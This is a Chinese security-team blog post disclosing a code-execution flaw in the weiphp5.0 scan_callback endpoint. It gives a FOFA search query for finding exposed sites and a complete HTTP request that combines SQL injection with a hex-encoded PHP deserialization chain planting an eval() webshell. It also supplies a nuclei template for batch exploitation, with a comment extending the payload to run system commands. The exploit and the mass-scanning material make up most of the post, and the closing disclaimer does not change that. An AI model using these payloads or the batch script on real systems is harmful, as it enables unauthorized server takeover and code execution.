#  weiphp5.0 scan_callback 代码执行漏洞   
原创 揽月  揽月安全团队   2024-03-13 08:50  
  
****  
![](https://mmbiz.qpic.cn/mmbiz_png/dMkBHvNs4Zcv4Jvxpl3UbVSojibKPhu1MelxDsTJic5Yx1JgKsFnKTAwyDYI6I68L3oYKBTyBSHywRUT7rPjia4hA/640 "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/YvzDI9CuDSUpdgX2009h9kBtCbBSmECNFpEJ17L81rkxhyEsRV7OC6RrsibIP9XtBQaPvIicbNjE07cmWHjxu9XQ/640 "")  
  
     漏洞简介  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/NiaPDicQv80ibpqv1RScj7vXwcdByeugibQetuKiaKADAZlWg6m8Xmpw6icrUHb4YNhVmqdlNz6ibVNGuhPrY3sx9NV8A/640 "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/twzJibG67ibBEe3NRPn5dIjic3rMrtjfuF6YZw52CVhtIiaXugI99PRjlWJc6BUvYnt5NohJ0guV8ibiaItPK7fShjkA/640 "")  
  
SPRING HAS ARRIVED  
  
  
  
  
weiphp5.0 scan_callback 存在代码执行漏洞  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/YvzDI9CuDSUpdgX2009h9kBtCbBSmECNFpEJ17L81rkxhyEsRV7OC6RrsibIP9XtBQaPvIicbNjE07cmWHjxu9XQ/640 "")  
  
      漏洞复现  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/NiaPDicQv80ibpqv1RScj7vXwcdByeugibQetuKiaKADAZlWg6m8Xmpw6icrUHb4YNhVmqdlNz6ibVNGuhPrY3sx9NV8A/640 "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/twzJibG67ibBEe3NRPn5dIjic3rMrtjfuF6YZw52CVhtIiaXugI99PRjlWJc6BUvYnt5NohJ0guV8ibiaItPK7fShjkA/640 "")  
  
SPRING HAS ARRIVED  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Jc0hYcs6Gs7ViblRuSadzzczsGZPgzNmQ8iaUbjvpXibYRicMge1TpYGwNAsfNHY15oibGl4Teawt4Tb7bsTx4Lu8Fw/640 "")  
  
  
  
第一步、使用以下fofa语句进行资产收集...确认测试目标  
```
fofa语句
(body="content=\"WeiPHP" || body="/css/weiphp.css" || title="weiphp" || title="weiphp4.0")
```  
  
  
第二步、使用burp抓取数据包发送到Repeater中修改以下数据包进行测试  
```

POST /public/index.php/weixin/Notice/index?img=echo+md5(123);exit(); HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
Connection: close
Content-Length: 1340
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

<xml>
<product_id>aaaa</product_id>
<appid>exp</appid>
<appid>=0) union select 1,2,3,4,5,6,7,0x4f3a32373a227468696e6b5c70726f636573735c70697065735c57696e646f7773223a313a7b733a33343a22007468696e6b5c70726f636573735c70697065735c57696e646f77730066696c6573223b613a313a7b693a303b4f3a31373a227468696e6b5c6d6f64656c5c5069766f74223a323a7b733a393a22002a00617070656e64223b613a313a7b733a333a226c696e223b613a313a7b693a303b733a323a223131223b7d7d733a31373a22007468696e6b5c4d6f64656c0064617461223b613a313a7b733a333a226c696e223b4f3a31333a227468696e6b5c52657175657374223a353a7b733a373a22002a00686f6f6b223b613a323a7b733a373a2276697369626c65223b613a323a7b693a303b723a383b693a313b733a353a226973436769223b7d733a363a22617070656e64223b613a323a7b693a303b723a383b693a313b733a363a226973416a6178223b7d7d733a393a22002a0066696c746572223b613a313a7b693a303b613a323a7b693a303b4f3a32313a227468696e6b5c766965775c6472697665725c506870223a303a7b7d693a313b733a373a22646973706c6179223b7d7d733a393a22002a00736572766572223b733a313a2231223b733a393a22002a00636f6e666967223b613a313a7b733a383a227661725f616a6178223b733a333a22696d67223b7d733a363a22002a00676574223b613a313a7b733a333a22696d67223b733a33303a223c3f70687020406576616c28245f524551554553545b27696d67275d293b223b7d7d7d7d7d7d,9,10,11,12-- </appid>
<mch_id>aaa</mch_id>
<nonce_str>aaa</nonce_str>
<openid>aaa</openid>
</xml>
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/dMkBHvNs4Zcv4Jvxpl3UbVSojibKPhu1Mtia5UTPlExJIn4M5n6pYvia81FtBppwOwnBW1JBS1biaF7hTG7aG57baA/640?wx_fmt=png&from=appmsg "")  
  
  
第三步、使用md5解密  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/dMkBHvNs4Zcv4Jvxpl3UbVSojibKPhu1MRiaSSFRQPdwST0UfuXCgWvILXIFKQV48HnGoRgf0gazkiaW4ljxbgukw/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/YvzDI9CuDSUpdgX2009h9kBtCbBSmECNFpEJ17L81rkxhyEsRV7OC6RrsibIP9XtBQaPvIicbNjE07cmWHjxu9XQ/640 "")  
  
       批量脚本  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/NiaPDicQv80ibpqv1RScj7vXwcdByeugibQetuKiaKADAZlWg6m8Xmpw6icrUHb4YNhVmqdlNz6ibVNGuhPrY3sx9NV8A/640 "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/twzJibG67ibBEe3NRPn5dIjic3rMrtjfuF6YZw52CVhtIiaXugI99PRjlWJc6BUvYnt5NohJ0guV8ibiaItPK7fShjkA/640 "")  
  
SPRING HAS ARRIVED  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Jc0hYcs6Gs7ViblRuSadzzczsGZPgzNmQ8iaUbjvpXibYRicMge1TpYGwNAsfNHY15oibGl4Teawt4Tb7bsTx4Lu8Fw/640 "")  
  
  
```
id: weiphp-cms-scan_callback-rce

info:
  name: weiphp-cms-scan_callback-rce
  author: unknow
  severity: critical
  description: weiphp5.0 scan_callback 存在代码执行漏洞。
  tags: weiphp,rce
  metadata:
    fofa-query: (body="content=\"WeiPHP" || body="/css/weiphp.css" || title="weiphp" || title="weiphp4.0")
http:
  - raw:
      - |
        POST /public/index.php/weixin/Notice/index?img={{rce}}exit(); HTTP/1.1
        Host: 
        Content-Type: application/x-www-form-urlencoded

        <xml>
        <product_id>aaaa</product_id>
        <appid>exp</appid>
        <appid>=0) union select 1,2,3,4,5,6,7,0x4f3a32373a227468696e6b5c70726f636573735c70697065735c57696e646f7773223a313a7b733a33343a22007468696e6b5c70726f636573735c70697065735c57696e646f77730066696c6573223b613a313a7b693a303b4f3a31373a227468696e6b5c6d6f64656c5c5069766f74223a323a7b733a393a22002a00617070656e64223b613a313a7b733a333a226c696e223b613a313a7b693a303b733a323a223131223b7d7d733a31373a22007468696e6b5c4d6f64656c0064617461223b613a313a7b733a333a226c696e223b4f3a31333a227468696e6b5c52657175657374223a353a7b733a373a22002a00686f6f6b223b613a323a7b733a373a2276697369626c65223b613a323a7b693a303b723a383b693a313b733a353a226973436769223b7d733a363a22617070656e64223b613a323a7b693a303b723a383b693a313b733a363a226973416a6178223b7d7d733a393a22002a0066696c746572223b613a313a7b693a303b613a323a7b693a303b4f3a32313a227468696e6b5c766965775c6472697665725c506870223a303a7b7d693a313b733a373a22646973706c6179223b7d7d733a393a22002a00736572766572223b733a313a2231223b733a393a22002a00636f6e666967223b613a313a7b733a383a227661725f616a6178223b733a333a22696d67223b7d733a363a22002a00676574223b613a313a7b733a333a22696d67223b733a33303a223c3f70687020406576616c28245f524551554553545b27696d67275d293b223b7d7d7d7d7d7d,9,10,11,12-- </appid>
        <mch_id>aaa</mch_id>
        <nonce_str>aaa</nonce_str>
        <openid>aaa</openid>
        </xml>

    payloads:
      rce:
        - "echo+md5(123);"

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - 'status_code_1==500 && contains(body_1, "202cb962ac59075b964b07152d234b70") && contains(header_1, "text/html")'

#执行：echo+md5(123);system('whoami');
```  
  
  
揽月安全团队发布、转载的文章中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途及盈利等目的，否则后果自行承担！！！！！  
  
![](https://mmbiz.qpic.cn/mmbiz_png/dMkBHvNs4Zcv4Jvxpl3UbVSojibKPhu1McicguRq2YOc7VqcDHB75WCryaXTj7krWciaPTszM9UByuqYRBcObRqRQ/640?wx_fmt=png&from=appmsg "")  
  
